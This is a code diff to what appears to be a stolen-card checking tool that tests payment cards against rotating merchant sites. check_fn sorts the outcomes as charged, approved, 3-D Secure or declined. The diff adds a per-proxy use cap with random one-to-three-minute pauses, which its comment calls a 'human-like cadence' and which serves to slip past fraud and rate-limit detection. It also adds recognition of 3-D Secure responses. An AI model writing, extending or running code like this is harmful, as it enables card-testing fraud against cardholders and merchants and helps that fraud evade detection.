@@ -125,6 +125,28 @@ def _next_site():
 _proxy_locks = {}
 _proxy_locks_guard = threading.Lock()
 
+# per-proxy lifetime cap: 5 checks -> random 1-3 min pause (human-like cadence)
+MAX_PROXY_USES = 5
+_proxy_uses = {}
+_proxy_paused_until = {}
+_proxy_uses_guard = threading.Lock()
+
+
+def _record_proxy_use(proxy):
+    with _proxy_uses_guard:
+        uses = _proxy_uses.get(proxy, 0) + 1
+        if uses >= MAX_PROXY_USES:
+            pause = random.randint(60, 180)  # 1-3 min
+            _proxy_paused_until[proxy] = time.time() + pause
+            _proxy_uses[proxy] = 0
+        else:
+            _proxy_uses[proxy] = uses
+
+
+def _proxy_usable(proxy):
+    with _proxy_uses_guard:
+        return time.time() >= _proxy_paused_until.get(proxy, 0)
+
 
 def _next_proxy():
     global _proxies
@@ -149,6 +171,8 @@ def _acquire_free_proxy():
         return None, None
     for _ in range(n):
         candidate = _proxies[next(_proxy_ctr) % n]
+        if not _proxy_usable(candidate):
+            continue
         lock = _proxy_lock(candidate)
         if lock.acquire(blocking=False):
             return candidate, lock
@@ -185,14 +209,18 @@ def check_fn(card):
         msg = data.get("message") or data.get("reason") or "N/A"
         if "amount too small" in (msg or "").lower():
             _bad_sites.add(_site_key(site))
+        m = (msg or "").lower()
         if status == "charged":
             return "CHARGED", msg, "CHARGED"
         if status == "approved":
             return "APPROVED", msg, "APPROVED"
+        if "3ds" in m or "3d secure" in m or "3-d secure" in m:
+            return "3DS", msg, "3DS"
         if status == "dead":
             return "DECLINED", msg, "UNKNOWN"
         return "ERROR", msg, "UNKNOWN"
     finally:
+        _record_proxy_use(proxy)
         lock.release()
 
 
